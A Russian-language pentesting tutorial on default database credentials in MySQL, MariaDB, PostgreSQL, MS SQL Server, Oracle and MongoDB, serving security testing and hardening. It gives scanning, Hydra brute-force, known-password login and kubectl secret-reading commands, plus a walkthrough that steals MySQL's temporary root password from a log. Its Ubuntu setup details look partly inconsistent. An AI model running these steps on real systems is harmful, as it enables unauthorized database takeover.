# Учётные данные по умолчанию в свежих установках СУБД

## Дефолтные учётные записи СУБД: проблема и терминология

При развёртывании новой системы управления базами данных (СУБД) администратор сталкивается с первичным доступом к серверу — именно на этом этапе существуют заранее определённые или автоматически генерируемые учётные данные. Под *учётными данными по умолчанию* (default credentials) в контексте СУБД понимают комбинацию имени пользователя и пароля, которая либо предустановлена разработчиком, либо создаётся инсталлятором без явного участия администратора. Такие данные представляют собой вектор атаки высокой степени риска, поскольку злоумышленник может получить к ним доступ до того, как организация применит политику смены паролей, или если администратор оставил настройки без изменений после установки.

Важно разделять несколько перекрывающихся понятий, которые часто смешивают в отчётах и руководствах:

- **Предустановленная учётная запись** — аккаунт с максимальными привилегиями, создаваемый автоматически в любой инсталляции (например, `root` в MySQL, `sa` в Microsoft SQL Server, `postgres` в PostgreSQL, `SYS` и `SYSTEM` в Oracle Database). Эти учётные записи не являются опциональными, без них СУБД не функционирует.
- **Стандартный пароль** — известная строка, которая в некоторых версиях или дистрибутивах присваивается предустановленной учётной записи, если пользователь не указал иного. Исторически многие СУБД использовали пустой пароль (`""`) или простые значения вроде `root`, `admin`, `password`. Со временем разработчики перешли к принудительному заданию пароля либо автоматической генерации случайного значения.
- **Временный пароль** — случайно сгенерированная строка, которую инсталлятор записывает в журнал установки и требует изменить при первом входе. Это эволюция подхода, нацеленная на исключение ситуации «пустого пароля», но оставляющая окно возможностей, если лог-файл доступен злоумышленнику.
- **Default credentials в смешанных режимах аутентификации** — многие СУБД поддерживают одновременно несколько методов проверки подлинности (например, Windows-аутентификация и SQL-аутентификация в MS SQL Server). Часто учётная запись `sa` отключена или не имеет пароля, пока администратор явно не переключит режим; злоумышленник может это использовать, если конфигурация оставлена незавершённой.

Различие между понятиями критично при тестировании на проникновение: пентестер не просто ищет «дефолтный пароль», а анализирует комбинацию метода аутентификации, версии СУБД, способа развёртывания (ручная установка, контейнер, облачный сервис) и остаточных артефактов установки. На практике успешная компрометация через учётные данные по умолчанию чаще всего связана с человеческим фактором: администратор при развёртывании тестовой среды использовал простой пароль и затем перенёс конфигурацию в продуктив, или забыл отключить встроенную учётную запись, оставшуюся со стандартным паролем.

## Политики назначения начальных паролей в популярных СУБД

Чтобы грамотно тестировать наличие стандартных учётных данных, необходимо понимать не только итоговую комбинацию логин-пароль, но и механизм её формирования. В каждой СУБД встроен свой жизненный цикл первичного администрирования, и злоумышленник, знающий эти детали, может локализовать точку входа, даже если пароль не совпадает с типовыми списками.

Ниже рассмотрен полный набор основных реляционных и документо-ориентированных СУБД, встречающихся в корпоративных средах, с акцентом на то, как именно создаются и передаются начальные учётные данные. Класс систем включает MySQL, MariaDB, PostgreSQL, Microsoft SQL Server, Oracle Database и MongoDB.

**MySQL / MariaDB**  
До версии 5.6 стандартная установка MySQL создавала пользователя `root` с пустым паролем, что позволяло любому локальному пользователю подключиться командой `mysql -u root` без пароля. Начиная с MySQL 5.7 инсталлятор (mysql_secure_installation после установки пакета или непосредственная установка из репозитория) генерирует случайный временный пароль, который записывается в лог ошибок сервера. Местоположение лога зависит от операционной системы и настроек; для Linux-систем на базе systemd типичный путь — `/var/log/mysqld.log`. Строка выглядит так:

```
[Note] A temporary password is generated for root@localhost: p!qH6Os<e1/,
```

Этот пароль действителен до первого входа, после чего сервер принудительно требует его сменить командой `ALTER USER`. Злоумышленник, имеющий доступ к серверу (например, через веб-шелл или локальную уязвимость), может прочитать этот лог и получить действующий временный пароль, если администратор ещё не выполнил первый вход.

MariaDB (форк MySQL) пошла по пути плагина `unix_socket`, который разрешает локальному системному пользователю `root` входить в базу данных без пароля через Unix-сокет. Этот механизм активен по умолчанию во многих дистрибутивах Linux. С точки зрения пентестера, компрометация системного root немедленно даёт доступ к MariaDB. Напротив, попытка TCP-подключения извне встретит отказ без пароля.

**PostgreSQL**  
В PostgreSQL концепция «дефолтного пароля» практически отсутствует: после инициализации кластера базы при помощи `initdb` создаётся роль `postgres` (суперпользователь) без пароля. Однако файл `pg_hba.conf` по умолчанию разрешает подключения только с локального Unix-сокета методом `peer`, т.е. верифицирует системного пользователя, под которым запущен процесс клиента. В результате сценарий эксплуатации выглядит так: атакующий, компрометировавший любую учётную запись на том же хосте, не может просто вызвать `psql -U postgres` и подключиться без пароля, поскольку peer потребует совпадения системной учётной записи `postgres`. Но часто администраторы изменяют peer на trust для удобства или разрешают TCP-соединения с trust/паролем из определённых подсетей. Тогда незапароленная роль становится полноценной default credential.

**Microsoft SQL Server**  
MS SQL Server имеет два режима аутентификации: Windows-аутентификация (только) и смешанный режим (Windows + SQL Server). Во время установки администратор выбирает режим. Если выбран смешанный, инсталлятор запрашивает пароль для учётной записи `sa`. При Windows-аутентификации `sa` остаётся отключённой, а все локальные администраторы сервера, входящие в группу `BUILTIN\Administrators`, получают роль `sysadmin` автоматически. Таким образом, «дефолтным доступом» в такой конфигурации является любой администратор операционной системы — злоумышленник, получивший шелл на сервере под локальным администратором, сможет подключиться к MSSQL с помощью `sqlcmd -E` без указания пароля. В смешанном режиме злоумышленник рассчитывает на слабые пароли `sa`, оставленные после установки, либо на ситуации, когда администратор в тестовой среде задал пустой пароль; многие инструменты пентеста перебирают пароли для `sa`, включая пустую строку.

**Oracle Database**  
Oracle Database поставляется с целым набором предустановленных учётных записей. Установщик Database Configuration Assistant (DBCA) запрашивает пароли для административных аккаунтов `SYS`, `SYSTEM`, `DBSNMP`, но исторически существовали известные пары, в том числе `SCOTT/TIGER`, `DBSNMP/DBSNMP`, `OUTLN/OUTLN`, `MDSYS/MDSYS`. Многие администраторы не отключают или не удаляют эти аккаунты после миграции или создания шаблонной базы. Более того, пароль `SYS` по умолчанию был `CHANGE_ON_INSTALL`, а `SYSTEM` — `MANAGER` (в старых версиях). Современные версии Oracle принудительно требуют сменить пароли, однако при восстановлении из бэкапа или использовании устаревших шаблонов эти значения могут сохраниться.

**MongoDB**  
Хотя MongoDB не относится к реляционным, её популярность требует упоминания. По умолчанию MongoDB не включает аутентификацию; любой клиент может подключиться без учётных данных. Пентестер, обнаруживший открытый порт 27017 без авторизации, получает полный доступ к данным. Это не дефолтный пароль, а отсутствие механизма, но суть та же: fresh install зачастую не защищена.

Каждая СУБД предоставляет уникальную поверхность атаки, обусловленную не столько уязвимостью кода, сколько особенностями процесса развёртывания.

## Методы обнаружения и эксплуатации стандартных кредов при пентесте

Практическая работа пентестера со стандартными учётными данными СУБД выстраивается в последовательность: идентификация сервиса и версии, выбор релевантных словарей или логики, аутентификация и закрепление. Каждый из этих этапов опирается на утилиты с открытым исходным кодом и ручной анализ.

**Обнаружение сервиса и сбор версии**  
Первым шагом является сканирование портов целевого хоста. Для популярных СУБД стандартные порты: 3306 (MySQL/MariaDB), 5432 (PostgreSQL), 1433 (MS SQL), 1521 (Oracle), 27017 (MongoDB). Nmap предоставляет скрипты для детектирования и снятия баннеров:

```bash
nmap -p 3306,5432,1433,1521 --script=banner -sV <target>
```

Баннерный вывод может содержать точную версию СУБД, что сужает набор потенциальных дефолтных паролей. Например, для Oracle NSE-скрипт `oracle-tns-version` извлекает версию Listener'а, которая обычно коррелирует с версией базы данных.

**Выбор списков учётных данных**  
Существуют специализированные словари для дефолтных кредов, агрегированные в проектах наподобие [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet). Инструмент `creds` из этого репозитория позволяет искать комбинации по имени продукта:

```bash
$ creds search mysql
+-------------------+----------+----------+
| Product           | username | password |
+-------------------+----------+----------+
| MySQL             | root     | (blank)  |
| MySQL             | root     | root     |
| MySQL             | admin    | admin    |
| MySQL (v5.7+)     | root     | (temp)   |  # генерируется, не фиксирован
+-------------------+----------+----------+
```

Кроме того, классический подход — использование секлистов [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials), где собраны сотни учётных записей для различных СУБД. Пентестер комбинирует готовые файлы с собственными предположениями, основанными на знании политик компании (например, часто добавляют `root:CompanyName2024`).

**Автоматизация перебора**  
Если сервис не имеет блокировок учётных записей (а многие СУБД по умолчанию их не включают), используется Hydra, Medusa или специализированные инструменты вроде mssqlclient.py из пакета Impacket. Пример запуска Hydra против MySQL:

```bash
hydra -l root -P /usr/share/wordlists/default-passwords/mysql.txt mysql://<target>
```

Однако более точный подход — использование скриптов, ориентированных на конкретную СУБД. Для MS SQL популярен скрипт `mssqlclient.py`, который может попытаться войти с пустым паролем `sa` или используя Windows-аутентификацию с выполненным `runas`. Пример проверки Windows-аутентификации из-под скомпрометированного пользователя:

```bash
# под пользователем, являющимся локальным администратором на целевой машине
sqlcmd -S <target> -E -Q "SELECT @@VERSION"
```

Если сервер допускает Windows-аутентификацию, этот вызов вернет версию без запроса пароля.

**Ручная верификация**  
После обнаружения потенциальных кредов аналитик подключается интерактивно, чтобы убедиться в уровне привилегий. Например, для MySQL команда:

```bash
mysql -u root -p'found_password' -h <target> -e "SELECT user, host, authentication_string FROM mysql.user;"
```

Для Oracle подключение через `sqlplus`:

```bash
sqlplus scott/tiger@<target>:1521/ORCL
```

Или в неинтерактивном режиме:

```bash
echo "SELECT * FROM V$VERSION;" | sqlplus -S scott/tiger@<target>:1521/ORCL
```

**Опасность и ограничения**  
Важно учитывать, что некоторые СУБД имеют политику блокировки учётных записей после нескольких неудачных попыток (профили в Oracle, настройки в MySQL начиная с определённого плагина). Агрессивный словарный перебор может привести к отказу в обслуживании легитимных пользователей. Кроме того, в сетях с системами обнаружения вторжений большое количество запросов к порту базы данных будет залогировано.

Частая ошибка пентестеров — игнорирование локального контекста. Например, если доступ получен к машине с PostgreSQL, попытка подключения по TCP с паролем, взятым из интернета, менее эффективна, чем чтение локального файла `pg_hba.conf` и вызов `psql` через сокет без пароля. Поэтому этап разведки должен включать сбор информации о конфигурационных файлах CУБД и привилегиях текущего пользователя.

Ещё один паттерн: временный пароль MySQL можно извлечь не только из лог-файла, но и из переменных окружения или Docker-логов при контейнеризации. В среде Kubernetes начальный пароль часто хранится в секретах, и при неправильном разграничении доступа атакующий может прочитать его через `kubectl get secret`.

Таким образом, эксплуатация дефолтных учётных данных сегодня — не просто угадывание пароля, а комплексный анализ конфигурации установщика. Практический инструментарий включает фаззинг через подготовленные словари, проверку локальных способов аутентификации без пароля и извлечение артефактов инсталляции.

## Сквозной практический пример: атака на MySQL 5.7 с временным паролем

Данный пример демонстрирует, как злоумышленник, получивший ограниченный доступ к серверу (например, через веб-уязвимость или локальный эксплойт), может воспользоваться временным паролем, сгенерированным при установке MySQL 5.7, для повышения привилегий до уровня администратора базы данных.

**Исходные условия:** Целевой Linux-сервер (Ubuntu 20.04) с открытым портом 3306, MySQL 5.7.29 установлен из официального репозитория, администратор ещё не выполнил первый вход под root и не сменил временный пароль. Пентестер имеет shell под непривилегированным пользователем `www-data`.

**Шаг 1: Обнаружение сервиса и подтверждение версии.**  
Сканируем порт 3306, чтобы убедиться, что это MySQL, и получить версию.

```bash
nmap -p 3306 -sV --script=banner 192.168.1.100
```

Вывод (фрагмент):

```text
PORT     STATE SERVICE  VERSION
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.20.04.1
| banner: >\x00\x00\x00\n5.7.29-0ubuntu0.20.04.1\x00...
```

**Шаг 2: Попытка подключения без пароля (ожидаемый провал).**  
Попробуем войти как root с пустым паролем, как это было в старых версиях. Неудача подтверждает, что пароль не пустой.

```bash
mysql -u root -h 127.0.0.1
```

Вывод:

```text
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
```

**Шаг 3: Поиск временного пароля в лог-файле.**  
Имея доступ на чтение файлов под `www-data`, проверяем право на чтение `/var/log/mysqld.log` (часто логи доступны для чтения всем пользователям или группе adm). Извлекаем строки, содержащие "temporary password".

```bash
grep 'temporary password' /var/log/mysqld.log
```

Вывод:

```text
2024-01-15T10:22:10.123456Z 1 [Note] A temporary password is generated for root@localhost: p!qH6Os<e1/,
```

Получен временный пароль: `p!qH6Os<e1/,`.

**Шаг 4: Подключение с временным паролем и получение информации.**  
Используем извлечённый пароль для входа. Поскольку сервер потребует смены пароля при первом же запросе, выполняем команду получения версии, которая вызовет принудительное приглашение к смене, но подтвердит факт успешного входа.

```bash
mysql -u root -p'p!qH6Os<e1/,' -e "SELECT VERSION();"
```

Вывод:

```text
ERROR 1820 (HY000) at line 1: You must reset your password using ALTER USER statement before executing this statement.
```

Хотя запрос не выполнен, сервер распознал учётные данные — ошибка 1820 говорит о том, что аутентификация прошла успешно, но аккаунт находится в состоянии ожидания смены пароля. Это означает, что злоумышленник может выполнить сброс пароля в интерактивном режиме.

**Ожидаемый вывод:** Пример демонстрирует, что знание внутреннего механизма установки MySQL позволяет обойти отсутствие типового дефолтного пароля. Временный пароль, предназначенный для безопасного первого входа, становится точкой компрометации, если лог-файл доступен для чтения. В реальном сценарии следующим шагом злоумышленник выполнит `ALTER USER` и получит полный контроль над СУБД.

Этот сценарий подчёркивает важность не только удаления логов после настройки, но и немедленного завершения процедуры инициализации сразу после установки — до того, как сервер окажется в зоне досягаемости потенциального противника.
